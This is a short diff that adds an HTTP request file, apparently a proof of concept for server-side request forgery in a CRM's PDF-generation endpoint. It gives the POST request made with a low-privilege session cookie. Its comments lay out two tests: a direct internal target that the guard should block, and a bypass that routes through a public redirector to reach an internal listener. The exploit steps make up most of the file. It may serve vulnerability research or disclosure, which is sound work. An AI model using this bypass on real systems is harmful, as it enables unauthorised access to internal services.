@@ -1,0 +1,8 @@
+POST /index.php?entryPoint=generatePdf HTTP/1.1
+Cookie: PHPSESSID=<low-priv-session>
+
+module=AOS_Quotes&uid=31799b68-77e2-48d8-8ab3-39754f55e8cf&templateID=433e9a40-3cd8-41d0-81e3-c1803f511309&task=pdf
+
+# product_image on the quote's line-item product is the SSRF target.
+# TEST 1 (guard sanity check): product_image = direct internal listener -> expect BLOCKED
+# TEST 2 (bypass): product_image = public httpbin.org redirector -> internal listener -> expect HIT
